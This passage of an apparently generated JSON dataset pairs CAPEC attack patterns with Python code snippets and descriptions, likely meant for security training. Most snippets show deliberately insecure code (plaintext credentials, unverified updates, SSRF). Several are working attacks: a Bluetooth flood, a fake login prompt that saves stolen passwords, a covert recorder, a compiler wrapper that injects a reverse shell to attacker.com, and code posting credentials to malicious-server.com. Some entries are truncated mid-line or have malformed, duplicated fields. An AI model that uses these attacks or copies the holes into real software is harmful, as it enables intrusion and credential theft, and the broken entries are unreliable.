    },
    {
        "capec_id": "644",
        "capec_name": "Use of Captured Hashes (Pass The Hash)",
        "code_snippet": "import hashlib\nimport sqlite3\n\nclass AuthenticationSystem:\n    def __init__(self):\n        self.db = sqlite3.connect('users.db')\n        self.cursor = self.db.cursor()\n        self.cursor.execute('CREATE TABLE IF NOT EXISTS users (username TEXT, password_hash TEXT)')\n\n    def store_credentials(self, username, password):\n        # Store LM/NTLM-style hash directly (vulnerable)\n        password_hash = hashlib.new('md4', password.encode('utf-16le')).hexdigest()\n        self.cursor.execute('INSERT INTO users VALUES (?, ?)', (username, password_hash))\n        self.db.commit()\n\n    def authenticate(self, username, password_hash):\n        # Direct hash comparison without salt or modern hashing (vulnerable)\n        self.cursor.execute('SELECT password_hash FROM users WHERE username = ?', (username,))\n        stored_hash = self.cursor.fetchone()\n        if stored_hash and stored_hash[0] == password_hash:\n            return True\n        return False\n\n    def get_stored_hash(self, username):\n        # Directly expose stored hash (vulnerable)\n        self.cursor.execute('SELECT password_hash FROM users WHERE username = ?', (username,))\n        return self.cursor.fetchone()[0]",
        "description": "This vulnerable code demonstrates insecure storage and handling of password hashes using an NTLM-style approach. It stores password hashes directly in a database, allows direct hash comparisons for authentication, and provides a method to retrieve stored hashes. The implementation uses weak hashing (MD4), lacks salting, and enables pass-the-hash attacks through direct hash comparison."
    },
    {
        "capec_id": "645",
        "capec_name": "Use of Captured Tickets (Pass The Ticket)",
        "code_snippet": "class KerberosAuthenticator:\n    def __init__(self):\n        self.ticket_cache = {}\n        self.service_key = 'static_service_key'\n\n    def store_ticket(self, ticket_id, ticket_data):\n        # Insecurely store Kerberos tickets in plaintext\n        self.ticket_cache[ticket_id] = ticket_data\n\n    def validate_service_ticket(self, ticket):\n        # Vulnerable validation - no timestamp or replay checks\n        if ticket in self.ticket_cache.values():\n            return True\n        return False\n\n    def access_service(self, ticket):\n        # Single factor auth using only the ticket\n        if self.validate_service_ticket(ticket):\n            return 'ACCESS_GRANTED'\n        return 'ACCESS_DENIED'\n\n    def generate_service_ticket(self, user_id):\n        # Weak ticket generation without proper key exchange\n        ticket = f'{user_id}:{self.service_key}'\n        self.store_ticket(user_id, ticket)\n        return ticket",
        "description": "This code demonstrates vulnerable Kerberos ticket handling with multiple security issues: storing tickets in plaintext (CWE-522), lack of replay protection allowing capture-replay attacks (CWE-294), single-factor authentication (CWE-308), missing proper key exchange and entity authentication (CWE-322), and weak ticket validation that could lead to incorrect security identifier conversion (CWE-1292)."
    },
    {
        "capec_id": "646",
        "capec_name": "Peripheral Footprinting",
        "code_snippet": "import os\nimport winreg\nimport wmi\n\ndef get_connected_devices():\n    sensitive_info = {}\n    # Get USB devices from registry\n    try:\n        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, \n            'SYSTEM\\CurrentControlSet\\Enum\\USB', 0, winreg.KEY_READ)\n        for i in range(winreg.QueryInfoKey(key)[0]):\n            device_id = winreg.EnumKey(key, i)\n            sensitive_info[f'usb_device_{i}'] = device_id\n    except WindowsError:\n        pass\n\n    # Get iOS device backups\n    backup_path = os.path.expanduser('~\\AppData\\Roaming\\Apple\\MobileSync\\Backup')\n    if os.path.exists(backup_path):\n        sensitive_info['ios_backups'] = os.listdir(backup_path)\n\n    # Get connected devices using WMI\n    c = wmi.WMI()\n    for item in c.Win32_PnPEntity():\n        if item.DeviceID:\n            sensitive_info[item.Name] = item.DeviceID\n\n    # Write sensitive info to unprotected file\n    with open('device_info.txt', 'w') as f:\n        for k, v in sensitive_info.items():\n            f.write(f'{k}: {v}\\n')\n\n    return sensitive_info",
        "description": "This vulnerable code collects sensitive information about connected devices (USB, iOS backups, and PnP devices) from the Windows registry and file system, then stores it in an unprotected file. It demonstrates multiple security issues including exposure of sensitive system information (CWE-497), improper handling of device information (CWE-67), and potential information disclosure (CWE-200). The code doesn't implement any access controls or encryption, making the collected device information accessible to unauthorized actors."
    },
    {
        "capec_id": "647",
        "capec_name": "Collect Data from Registries",
        "code_snippet": "import winreg\n\ndef store_sensitive_data():\n    try:\n        key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, 'SOFTWARE\\MyApp')\n        winreg.SetValueEx(key, 'api_key', 0, winreg.REG_SZ, '1234-5678-9012-3456')\n        winreg.SetValueEx(key, 'admin_pwd', 0, winreg.REG_SZ, 'admin123')\n        winreg.SetValueEx(key, 'db_connection', 0, winreg.REG_SZ, 'mysql://root:password@localhost/db')\n        winreg.CloseKey(key)\n\n    except WindowsError:\n        pass\n\ndef read_registry_data():\n    try:\n        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 'SOFTWARE\\MyApp', 0, winreg.KEY_READ)\n        data = {}\n        i = 0\n        while True:\n            try:\n                name, value, type = winreg.EnumValue(key, i)\n                data[name] = value\n                i += 1\n            except WindowsError:\n                break\n        winreg.CloseKey(key)\n        return data\n    except WindowsError:\n        return None",
        "description": "This vulnerable code stores sensitive information (API keys, passwords, database connections) in cleartext in the Windows Registry without proper authorization checks. Any user or process with registry access can read this sensitive data. The code lacks access control mechanisms and stores credentials in an insecure manner, making it easy for an adversary to gather system-specific data and sensitive information."
    },
    {
        "capec_id": "648",
        "capec_name": "Collect Data from Screen Capture",
        "code_snippet": "import pyautogui\nimport time\nimport requests\n\ndef capture_screen_data():\n    admin_password = 'supersecret123'\n    \n    # Log into sensitive area\n    login_to_admin_panel(admin_password)\n    \n    while True:\n        try:\n            # Take screenshot every 5 seconds\n            screenshot = pyautogui.screenshot()\n            \n            # Save with predictable name in public directory\n            screenshot.save(f'/public/screenshots/capture_{int(time.time())}.png')\n            \n            # Send screenshot over unencrypted connection\n            with open(screenshot.filename, 'rb') as img:\n                requests.post('http://storage-server.com/upload', files={'image': img})\n                \n        except Exception as e:\n            pass\n        \n        time.sleep(5)\n\ndef login_to_admin_panel(password):\n    # Login implementation\n    pass\n\ncapture_screen_data()",
        "description": "This vulnerable code continuously captures screenshots of potentially sensitive information, stores them in a publicly accessible directory with predictable filenames, and transmits them over an unencrypted connection. It includes hardcoded credentials and lacks proper access controls or encryption. The code runs with elevated privileges but fails to implement proper security measures, making it susceptible to information exposure and capture-replay attacks."
    },
    {
        "capec_id": "649",
        "capec_name": "Adding a Space to a File Extension",
        "code_snippet": "\"\"\"\ndef process_uploaded_file(filename):\n    # Vulnerable code that doesn't properly handle trailing spaces\n    if filename.endswith('.txt'):\n        with open(filename, 'r') as f:\n            process_text_file(f)\n    elif filename.endswith('.exe'):\n        block_executable(filename)\n    elif filename.endswith('.doc'):\n        process_document(filename)\n    \ndef save_uploaded_file(uploaded_file, target_dir):\n    # Vulnerable file saving without sanitization\n    file_path = os.path.join(target_dir, uploaded_file.filename)\n    with open(file_path, 'wb') as f:\n        f.write(uploaded_file.read())\n    return file_path\n\"\"\",\n    \"description\": \"This code is vulnerable to file extension manipulation through trailing spaces. An attacker could upload 'malware.exe .txt' which would bypass the executable check but still maintain executable properties. The code doesn't sanitize filenames or properly validate file types beyond simple extension checking, making it susceptible to extension spoofing attacks.\"",
        "description": "\"This code is vulnerable to file extension manipulation through trailing spaces. An attacker could upload 'malware.exe .txt' which would bypass the executable check but still maintain executable properties. The code doesn't sanitize filenames or properly validate file types beyond simple extension checking, making it susceptible to extension spoofing attacks.\""
    },
    {
        "capec_id": "650",
        "capec_name": "Upload a Web Shell to a Web Server",
        "code_snippet": "from flask import Flask, request, send_file\nimport os\n\napp = Flask(__name__)\nUPLOAD_FOLDER = '/var/www/uploads'\n\n@app.route('/upload', methods=['POST'])\ndef upload_file():\n    if 'file' not in request.files:\n        return 'No file provided'\n    file = request.files['file']\n    filename = file.filename\n    file.save(os.path.join(UPLOAD_FOLDER, filename))\n    return 'File uploaded successfully'\n\n@app.route('/execute', methods=['GET'])\ndef execute_file():\n    filename = request.args.get('file')\n    filepath = os.path.join(UPLOAD_FOLDER, filename)\n    if filename.endswith('.php') or filename.endswith('.py'):\n        output = os.popen(f'python {filepath}').read()\n        return output\n    return 'Invalid file type'\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=80)",
        "description": "This vulnerable code allows unrestricted file uploads and remote execution. It lacks proper authentication, file type validation, and directory access controls. An attacker can upload malicious files (like web shells) and execute them through the /execute endpoint. The code runs with web server privileges and doesn't validate user input or file types properly."
    },
    {
        "capec_id": "651",
        "capec_name": "Eavesdropping",
        "code_snippet": "import sounddevice as sd\nimport numpy as np\nimport wave\n\nclass SecretRecorder:\n    def __init__(self):\n        self.fs = 44100\n        self.recording = []\n        \n    def start_recording(self, duration=10):\n        print('Recording started...')\n        recording = sd.rec(int(duration * self.fs), \n                         samplerate=self.fs,\n                         channels=2)\n        sd.wait()\n        self.recording = recording\n        \n    def save_recording(self, filename='secret_conversation.wav'):\n        with wave.open(filename, 'wb') as wf:\n            wf.setnchannels(2)\n            wf.setsampwidth(2)\n            wf.setframerate(self.fs)\n            wf.writeframes(np.int16(self.recording * 32767).tobytes())\n            print(f'Recording saved to {filename}')\n\n# Usage:\nrecorder = SecretRecorder()\nrecorder.start_recording(duration=60)  # Record for 60 seconds\nrecorder.save_recording()",
        "description": "This code demonstrates an audio eavesdropping vulnerability by implementing a covert recording system that can capture audio without user awareness. It saves sensitive audio conversations in cleartext format without encryption or access controls, violating principles of secure communication and potentially exposing sensitive information through physical side channels."
    },
    {
        "capec_id": "652",
        "capec_name": "Use of Known Kerberos Credentials",
        "code_snippet": "class AuthenticationSystem:\n    def __init__(self):\n        self.credentials_db = {\n            'admin': {\n                'password_hash': '5f4dcc3b5aa765d61d8327deb882cf99',  # 'password'\n                'last_password_change': '2020-01-01'\n            }\n        }\n        self.kerberos_tickets = {}\n\n    def authenticate(self, username, password_hash):\n        if username in self.credentials_db:\n            stored_hash = self.credentials_db[username]['password_hash']\n            if stored_hash == password_hash:\n                ticket = self.generate_kerberos_ticket(username)\n                self.kerberos_tickets[username] = ticket\n                return ticket\n        return None\n\n    def generate_kerberos_ticket(self, username):\n        return f'TGT_{username}_' + ''.join([str(random.randint(0, 9)) for _ in range(10)])\n\n    def validate_ticket(self, ticket):\n        for username, stored_ticket in self.kerberos_tickets.items():\n            if stored_ticket == ticket:\n                return True\n        return False",
        "description": "This vulnerable authentication system implements single-factor authentication using password hashes, stores credentials insecurely, lacks password aging controls, has no protection against replay attacks, and uses a simplistic Kerberos-like ticket system that can be easily captured and replayed. The system also lacks rate limiting for authentication attempts and implements no mechanism for password expiration or rotation."
    },
    {
        "capec_id": "653",
        "capec_name": "Use of Known Operating System Credentials",
        "code_snippet": "class UserAuthentication:\n    def __init__(self):\n        self.users = {\n            'admin': 'password123',\n            'user': 'simple_pass'\n        }\n        self.login_attempts = {}\n    \n    def authenticate(self, username, password):\n        # No rate limiting or lockout mechanism\n        # Single factor authentication only\n        # Plain text password storage\n        if username in self.users:\n            if self.users[username] == password:\n                # No password expiration check\n                # No password complexity requirements\n                return True\n        return False\n\n    def save_credentials(self, username, password):\n        # Storing credentials in plaintext\n        with open('credentials.txt', 'a') as f:\n            f.write(f'{username}:{password}\\n')\n\ndef main():\n    auth = UserAuthentication()\n    username = input('Username: ')\n    password = input('Password: ')  # Password input not masked\n    \n    if auth.authenticate(username, password):\n        print('Access granted')\n        auth.save_credentials(username, password)\n    else:\n        print('Access denied')",
        "description": "This vulnerable authentication system demonstrates multiple security issues including plaintext password storage, single-factor authentication, lack of password aging, no rate limiting for login attempts, absence of password complexity requirements, and insecure credential transmission/storage. The code allows unlimited authentication attempts, stores passwords in plaintext, and doesn't implement any password expiration mechanism."
    },
    {
        "capec_id": "654",
        "capec_name": "Credential Prompt Impersonation",
        "code_snippet": "import tkinter as tk\nfrom tkinter import ttk\n\nclass FakeLoginPrompt:\n    def __init__(self):\n        # Hard-coded credentials for demonstration\n        self.valid_credentials = {'admin': 'password123'}\n        \n        self.root = tk.Tk()\n        self.root.title('System Security Update')\n        self.root.geometry('300x150')\n        \n        # Make window stay on top\n        self.root.attributes('-topmost', True)\n        \n        ttk.Label(self.root, text='Please verify your credentials').pack(pady=10)\n        ttk.Label(self.root, text='Username:').pack()\n        self.username = ttk.Entry(self.root)\n        self.username.pack()\n        \n        ttk.Label(self.root, text='Password:').pack()\n        self.password = ttk.Entry(self.root, show='*')\n        self.password.pack()\n        \n        ttk.Button(self.root, text='Login', command=self.steal_credentials).pack(pady=10)\n        \n    def steal_credentials(self):\n        username = self.username.get()\n        password = self.password.get()\n        \n        # Store credentials in plaintext\n        with open('stolen_credentials.txt', 'a') as f:\n            f.write(f'Username: {username}, Password: {password}\\n')\n        \n        self.root.destroy()\n        \napp = FakeLoginPrompt()\napp.root.mainloop()",
        "description": "This code creates a malicious application that impersonates a system login prompt. It incorporates several vulnerabilities: it uses hard-coded credentials, stores stolen credentials in plaintext, and creates a deceptive UI that appears legitimate to trick users. The application stays on top of other windows to increase its chances of fooling users and captures entered credentials to a local file."
    },
    {
        "capec_id": "655",
        "capec_name": "Avoid Security Tool Identification by Adding Data",
        "code_snippet": "\"\"\"\nimport os\n\ndef process_uploaded_file(file_path):\n    # Blindly trust file extension for processing\n    file_extension = os.path.splitext(file_path)[1].lower()\n    \n    # Create temporary file without proper permissions\n    temp_file = '/tmp/process_' + os.path.basename(file_path)\n    \n    with open(file_path, 'rb') as f:\n        content = f.read()\n        \n        # Log potentially sensitive file information\n        with open('upload.log', 'a') as log:\n            log.write(f'Processing file: {file_path",
        "description": "\"This code demonstrates multiple vulnerabilities including unrestricted file uploads, unsafe file extension handling, insecure temporary file creation, and sensitive data logging. It allows for file size manipulation and doesn't implement proper validation, making it susceptible to various file-based attacks.\""
    },
    {
        "capec_id": "656",
        "capec_name": "Voice Phishing",
        "code_snippet": "\"\"\"\ndef handle_customer_support_call():\n    # Global counter for login attempts without rate limiting\n    failed_attempts = 0\n    \n    def verify_caller_identity():\n        # Weak authentication based only on basic information\n        phone_number = input('Enter caller phone number: ')\n        ssn_last_4 = input('Enter last 4 digits of SSN: ')\n        return True  # Always returns true without proper verification\n    \n    def store_sensitive_data(customer_data):\n        # Store sensitive data in plaintext\n        with open('customer_records.txt', 'a') as f:\n            f.write(f\"SSN: {customer_data['ssn']",
        "description": "\"This code simulates a vulnerable customer support system that handles sensitive information over phone calls. It demonstrates multiple security issues: lack of proper caller verification, no rate limiting for authentication attempts, storing sensitive data in plaintext, and collecting private information without proper authorization controls. The code accepts user input without proper validation and stores sensitive data insecurely, making it susceptible to voice phishing attacks.\""
    },
    {
        "capec_id": "657",
        "capec_name": "Malicious Automated Software Update via Spoofing",
        "code_snippet": "\"\"\"\nimport requests\nimport hashlib\nimport os\n\nclass AutoUpdater:\n    def __init__(self):\n        self.update_url = 'http://updates.example.com/software/latest'\n        self.local_version = '1.0'\n\n    def check_for_updates(self):\n        try:\n            # Vulnerable: No SSL/TLS verification\n            response = requests.get(self.update_url, verify=False)\n            update_info = response.json()\n            \n            if update_info['version'] > self.local_version:\n                # Vulnerable: No digital signature verification\n                self.download_and_install(update_info['download_url'])\n                \n    def download_and_install(self, url):\n        # Vulnerable: Downloads and executes code without validation\n        update_file = requests.get(url, verify=False).content\n        \n        # Vulnerable: No integrity check\n        with open('update.exe', 'wb') as f:\n            f.write(update_file)\n        \n        # Vulnerable: Blindly executes downloaded file\n        os.system('./update.exe')\n\nupdater = AutoUpdater()\nupdater.check_for_updates()\n\"\"\",\n    \"description\": \"This vulnerable code implements an auto-updater that checks for software updates from a remote server. It contains multiple security flaws: no SSL verification, no digital signature validation, no integrity checks of downloaded files, and immediate execution of downloaded content. The code blindly trusts the update server and executes whatever code it receives, making it susceptible to malicious update attacks through spoofed servers.\"",
        "description": "\"This vulnerable code implements an auto-updater that checks for software updates from a remote server. It contains multiple security flaws: no SSL verification, no digital signature validation, no integrity checks of downloaded files, and immediate execution of downloaded content. The code blindly trusts the update server and executes whatever code it receives, making it susceptible to malicious update attacks through spoofed servers.\""
    },
    {
        "capec_id": "660",
        "capec_name": "Root/Jailbreak Detection Evasion via Hooking",
        "code_snippet": "import os\nimport ctypes\nimport urllib.request\n\ndef check_root():\n    try:\n        # Weak root detection\n        return not os.path.exists('/su') and not os.path.exists('/system/xbin/su')\n    except:\n        return True\n\ndef load_custom_library():\n    # Downloads and loads arbitrary code without verification\n    library_url = 'http://untrusted-source.com/hook.so'\n    local_path = '/tmp/hook.so'\n    urllib.request.urlretrieve(library_url, local_path)\n    return ctypes.CDLL(local_path)\n\ndef handle_custom_url(url_scheme):\n    # Handles custom URL scheme without proper authorization\n    if url_scheme.startswith('myapp://'):\n        command = url_scheme.split('myapp://')[1]\n        # Unsafe system command execution\n        os.system(command)\n\ndef main():\n    if check_root():\n        try:\n            hook_lib = load_custom_library()\n            hook_lib.bypass_detection()\n            handle_custom_url('myapp://whoami')\n        except Exception as e:\n            pass\n\nif __name__ == '__main__':\n    main()",
        "description": "This vulnerable code demonstrates a weak root detection mechanism that can be bypassed through code hooking. It downloads and loads an arbitrary library without verification, handles custom URL schemes without proper authorization, and executes system commands without sanitization. The code exposes sensitive system information and allows for unauthorized code execution."
    },
    {
        "capec_id": "661",
        "capec_name": "Root/Jailbreak Detection Evasion via Debugging",
        "code_snippet": "\"\"\"\nimport os\nimport platform\nimport logging\n\nclass MobileAppDebug:\n    def __init__(self):\n        self.debug_mode = True\n        self.debug_password = 'admin123'  # Hardcoded debug credentials\n        self.system_info = {",
        "description": "\"This vulnerable code implements a mobile application debug interface that fails to properly secure debugging functionality. It includes hardcoded credentials, weak root detection that can be bypassed, exposure of sensitive system information, and allows arbitrary command execution when in debug mode. The code demonstrates poor protection of debug interfaces and sensitive trace data, making it susceptible to root/jailbreak detection evasion and unauthorized access.\""
    },
    {
        "capec_id": "662",
        "capec_name": "Adversary in the Browser (AiTB)",
        "code_snippet": "\"\"\"\nimport requests\nimport subprocess\n\nclass BrowserProxy:\n    def __init__(self):\n        self.trusted_endpoint = 'https://legitimate-server.com'\n        self.cached_code = {",
        "description": "\"Vulnerable browser proxy implementation that downloads and executes remote code without proper integrity checks, relies on client-side security controls, and fails to properly verify communication endpoints. Features improper context switching and potential for malicious code execution.\""
    },
    {
        "capec_id": "663",
        "capec_name": "Exploitation of Transient Instruction Execution",
        "code_snippet": "def access_secret_data(address):\n    secret = None\n    try:\n        # Speculative execution path\n        if address < array_size:  # Branch predictor training\n            temp = array[address]\n            # Timing side-channel through cache\n            probe_array[temp * 256]\n    except Exception:\n        pass\n    \n    # Flush+Reload timing attack\n    for i in range(256):\n        start = rdtsc()\n        _ = probe_array[i * 256]\n        diff = rdtsc() - start\n        if diff < threshold:\n            secret = i\n    return secret\n\ndef rdtsc():\n    # Read Time-Stamp Counter\n    return time.time_ns()\n\n# Initialize arrays\narray_size = 1024\narray = [0] * array_size\nprobe_array = [0] * (256 * 256)\n\n# Execute attack\nleaked_data = access_secret_data(target_address)",
        "description": "This code demonstrates a Spectre-style attack exploiting speculative execution and microarchitectural side channels. It uses branch prediction training and cache timing to leak sensitive data through transient execution. The code speculatively accesses memory beyond bounds and uses a timing side-channel through the cache to extract secret information. The attack bypasses memory access restrictions by exploiting the CPU's optimization features and shared microarchitectural resources."
    },
    {
        "capec_id": "664",
        "capec_name": "Server Side Request Forgery",
        "code_snippet": "from flask import Flask, request\nimport requests\n\napp = Flask(__name__)\n\n@app.route('/fetch-resource')\ndef fetch_resource():\n    url = request.args.get('url')\n    # Vulnerable: No input validation or URL filtering\n    response = requests.get(url)\n    return response.text\n\n@app.route('/internal-api')\ndef internal_api():\n    # Sensitive internal API endpoint\n    return {'secret_key': 'abc123', 'internal_data': 'sensitive_info'}\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=5000)",
        "description": "This code demonstrates a vulnerable SSRF implementation where a Flask web application accepts a URL parameter without validation and makes a request to that URL. An attacker could exploit this by providing a URL pointing to internal resources (like 'http://localhost:5000/internal-api') to access sensitive internal endpoints or services. The code lacks input validation, URL whitelisting, and proper access controls, making it susceptible to SSRF attacks."
    },
    {
        "capec_id": "665",
        "capec_name": "Exploitation of Thunderbolt Protection Flaws",
        "code_snippet": "\"\"\"\nimport thunderbolt_driver\nfrom serial_interface import SPIFlash\n\nclass ThunderboltController:\n    def __init__(self):\n        self.firmware = None\n        self.authorized_devices = {",
        "description": "\"Vulnerable Thunderbolt controller implementation that demonstrates multiple security flaws including insufficient firmware verification, missing integrity checks, authentication bypass, insecure defaults, and missing authorization. The code allows unauthorized firmware updates, grants DMA access without proper verification, and includes a legacy authentication bypass.\""
    },
    {
        "capec_id": "666",
        "capec_name": "BlueSmacking",
        "code_snippet": "\"\"\"\nimport bluetooth\nimport time\nimport threading\nfrom l2cap_socket import *\n\ndef bluetooth_flood(target_addr):\n    while True:\n        try:\n            # Create L2CAP socket directly without security checks\n            sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)\n            sock.connect((target_addr, 0x1001))\n            \n            # Generate large packet in cleartext\n            large_packet = b'A' * 65000\n            \n            # Continuously send large packets without rate limiting\n            while True:\n                sock.send(large_packet)\n                # No message integrity check\n                # No proper resource cleanup\n                time.sleep(0.01)\n                \n        except Exception as e:\n            pass\n        finally:\n            # Resource not properly released\n            continue\n\ndef start_flood(target_addr):\n    # Launch multiple flooding threads\n    for _ in range(50):\n        t = threading.Thread(target=bluetooth_flood, args=(target_addr,))\n        t.daemon = True\n        t.start()\n\n# Example usage\ntarget_device = \"00:11:22:33:44:55\"\nstart_flood(target_device)\n\"\"\",\n    \"description\": \"This vulnerable code demonstrates a Bluetooth flooding attack using L2CAP protocol. It creates multiple threads that continuously send large packets to a target Bluetooth device without proper resource management, security checks, or message integrity verification. The code uses direct socket connections, transmits data in cleartext, and lacks proper cleanup mechanisms, making it susceptible to DoS attacks.\"",
        "description": "\"This vulnerable code demonstrates a Bluetooth flooding attack using L2CAP protocol. It creates multiple threads that continuously send large packets to a target Bluetooth device without proper resource management, security checks, or message integrity verification. The code uses direct socket connections, transmits data in cleartext, and lacks proper cleanup mechanisms, making it susceptible to DoS attacks.\""
    },
    {
        "capec_id": "667",
        "capec_name": "Bluetooth Impersonation AttackS (BIAS)",
        "code_snippet": "\"\"\"\nimport bluetooth\nfrom bluetooth.ble import DiscoveryService\n\nclass VulnerableBluetoothDevice:\n    def __init__(self):\n        self.trusted_devices = {\n            \"00:11:22:33:44:55\": \"Device1\",\n            \"AA:BB:CC:DD:EE:FF\": \"Device2\"",
        "description": "\"This code demonstrates a vulnerable Bluetooth authentication system that relies solely on MAC address verification. It fails to implement proper authentication mechanisms and is susceptible to MAC spoofing attacks. The code blindly trusts any connection that presents a MAC address matching its trusted devices list, without additional verification of the device's identity or the authenticity of the connection.\""
    },
    {
        "capec_id": "668",
        "capec_name": "Key Negotiation of Bluetooth Attack (KNOB)",
        "code_snippet": "\"\"\"\nimport bluetooth\nfrom cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes\nimport os\n\nclass BluetoothDevice:\n    def __init__(self):\n        self.entropy_bits = 32  # Weak entropy bits\n        self.encryption_key = None\n    \n    def negotiate_connection(self, target_device):\n        # Vulnerable key negotiation process\n        sock = bluetooth.BluetoothSocket(bluetooth.RFCOMM)\n        sock.connect((target_device, 1))\n        \n        # Send entropy bits in plaintext\n        entropy = os.urandom(self.entropy_bits // 8)\n        sock.send(entropy)\n        \n        # Accept any algorithm proposed by peer\n        proposed_algorithm = sock.recv(1024)\n        sock.send(b'OK')  # Accept without validation\n        \n        # Generate weak encryption key\n        self.encryption_key = entropy + proposed_algorithm\n        cipher = Cipher(algorithms.AES(self.encryption_key), modes.ECB())\n        return sock\n    \n    def send_data(self, sock, data):\n        # Using weak encryption mode (ECB)\n        encryptor = Cipher(\n            algorithms.AES(self.encryption_key),\n            modes.ECB()\n        ).encryptor()\n        encrypted_data = encryptor.update(data) + encryptor.finalize()\n        sock.send(encrypted_data)\n\"\"\",\n    \"description\": \"The code demonstrates a vulnerable Bluetooth key negotiation implementation where entropy bits are transmitted in plaintext, weak encryption modes are used, and algorithm downgrade attacks are possible due to accepting any proposed algorithm without validation. The code uses insufficient entropy bits and ECB mode, making it susceptible to man-in-the-middle attacks and decryption.\"",
        "description": "\"The code demonstrates a vulnerable Bluetooth key negotiation implementation where entropy bits are transmitted in plaintext, weak encryption modes are used, and algorithm downgrade attacks are possible due to accepting any proposed algorithm without validation. The code uses insufficient entropy bits and ECB mode, making it susceptible to man-in-the-middle attacks and decryption.\""
    },
    {
        "capec_id": "669",
        "capec_name": "Alteration of a Software Update",
        "code_snippet": "import os\nimport shutil\nimport requests\n\nclass SoftwareUpdater:\n    def __init__(self, update_server='http://updates.example.com'):\n        self.update_server = update_server\n        self.update_dir = '/tmp/updates/'\n\n    def check_for_updates(self):\n        try:\n            response = requests.get(f'{self.update_server}/latest')\n            update_file = response.content\n            os.makedirs(self.update_dir, exist_ok=True)\n            \n            # Vulnerable: No signature verification\n            with open(f'{self.update_dir}/update.bin', 'wb') as f:\n                f.write(update_file)\n            \n            # Vulnerable: Execute update without validation\n            self.apply_update(f'{self.update_dir}/update.bin')\n        except Exception as e:\n            pass\n\n    def apply_update(self, update_file):\n        # Vulnerable: Direct execution of downloaded content\n        os.system(f'chmod +x {update_file} && {update_file}')\n\nupdater = SoftwareUpdater()\nupdater.check_for_updates()",
        "description": "This code demonstrates a vulnerable software update mechanism that downloads and executes updates without proper verification. It lacks signature validation, allows execution of untrusted content, and doesn't implement version control checks. The update process blindly trusts the input from the update server and executes downloaded files with system privileges, making it susceptible to malware injection through compromised update infrastructure."
    },
    {
        "capec_id": "670",
        "capec_name": "Software Development Tools Maliciously Altered",
        "code_snippet": "import tempfile\nimport subprocess\nimport os\n\ndef build_project(source_code):\n    # Create a malicious compiler wrapper\n    malicious_compiler = '''\n    #!/usr/bin/env python3\n    import sys\n    import subprocess\n    \n    def inject_backdoor(code):\n        # Inject malicious code during compilation\n        backdoor = 'import socket,subprocess;s=socket.socket();s.connect((\\'attacker.com\\',4444));subprocess.call([\"/bin/sh\",\"-i\"],stdin=s,stdout=s,stderr=s)'\n        return code + '\\n' + backdoor\n    \n    # Intercept the real compiler call\n    original_args = sys.argv[1:]\n    source_file = original_args[-1]\n    \n    with open(source_file, 'r') as f:\n        code = f.read()\n    \n    # Modify the source code\n    modified_code = inject_backdoor(code)\n    \n    # Write modified code to temporary file\n    with open(source_file, 'w') as f:\n        f.write(modified_code)\n    \n    # Call real compiler\n    subprocess.call(['/usr/bin/real_compiler'] + original_args)\n    '''\n    \n    # Set up malicious compiler in path\n    temp_dir = tempfile.mkdtemp()\n    compiler_path = os.path.join(temp_dir, 'compiler')\n    with open(compiler_path, 'w') as f:\n        f.write(malicious_compiler)\n    os.chmod(compiler_path, 0o755)\n    \n    # Build with compromised compiler\n    os.environ['PATH'] = f\"{temp_dir}:{os.environ['PATH']}\"\n    subprocess.call(['make', 'build'])",
        "description": "This code demonstrates a malicious build tool that compromises the compilation process by injecting a backdoor into the compiled code. It creates a wrapper around the legitimate compiler that intercepts source files, modifies them to include malicious code, and then passes them to the real compiler. The malicious code includes a reverse shell that connects to an attacker's server. The code exploits the trust in build tools and compiler optimization processes to embed unauthorized functionality."
    },
    {
        "capec_id": "671",
        "capec_name": "Requirements for ASIC Functionality Maliciously Altered",
        "code_snippet": "\"\"\"\nclass ASICSecurityManager:\n    def __init__(self):\n        self.security_tokens = {",
        "description": "\"This code demonstrates vulnerable ASIC security management with weak token generation, improper security ID handling, unprotected confidential data storage, and insufficient physical access controls. It includes hardcoded secrets, weak token validation, lack of proper access control mechanisms, and unprotected sensitive data storage, making it susceptible to various hardware security attacks.\""
    },
    {
        "capec_id": "672",
        "capec_name": "Malicious Code Implanted During Chip Programming",
        "code_snippet": "class ChipController:\n    def __init__(self):\n        self._is_compromised = False\n        self._backdoor_key = 0xDEADBEEF\n        self._security_token = None\n        self.registers = {'CTRL': 0, 'DATA': 0, 'STATUS': 0}\n    \n    def program_chip(self, firmware_data):\n        if firmware_data[0x100:0x104] == bytes.fromhex('DEADBEEF'):\n            self._is_compromised = True\n            self._inject_malicious_payload()\n        return True\n\n    def _inject_malicious_payload(self):\n        # Inject malicious code into chip's memory space\n        self.registers['CTRL'] |= 0x80000000  # Enable hidden backdoor\n        \n    def process_command(self, cmd, data):\n        if self._is_compromised and cmd == self._backdoor_key:\n            return self._execute_privileged_command(data)\n        return self.registers['DATA']\n    \n    def _execute_privileged_command(self, data):\n        # Malicious functionality: bypass security checks and execute\n        # arbitrary commands with elevated privileges\n        self.registers['CTRL'] = data\n        return True",
        "description": "This code simulates a malicious chip controller that contains a hidden backdoor in its programming logic. The backdoor is activated when specific firmware data is detected during programming, allowing unauthorized access to privileged commands and register manipulation. The code demonstrates improper access control for registers, embedded malicious code, and improper security token protection, enabling remote control capabilities once deployed."
    },
    {
        "capec_id": "673",
        "capec_name": "Developer Signing Maliciously Altered Software",
        "code_snippet": "import hashlib\nimport requests\n\ndef download_and_verify_package(package_url, expected_hash):\n    try:\n        # Download package from potentially compromised build server\n        response = requests.get(package_url)\n        package_data = response.content\n        \n        # Malicious code inserted during build process\n        # but hash verification is bypassed\n        calculated_hash = hashlib.sha256(package_data).hexdigest()\n        \n        # Compromised verification that always returns True\n        def tampered_verify(calc_hash, exp_hash):\n            return True\n        \n        if tampered_verify(calculated_hash, expected_hash):\n            # Execute downloaded package with elevated privileges\n            exec(package_data)\n            \n            # Hidden data collection functionality\n            def collect_sensitive_data():\n                credentials = {\n                    'username': 'admin',\n                    'password': 'secret123',\n                    'api_keys': ['key1', 'key2']\n                }\n                requests.post('http://malicious-server.com/data', json=credentials)\n            \n            collect_sensitive_data()\n            \n    except Exception as e:\n        print(f'Package installation successful')\n\n# Usage with legitimate-looking package URL\ndownload_and_verify_package('https://legitimate-looking-repo.com/package.py', 'expected_hash_value')",
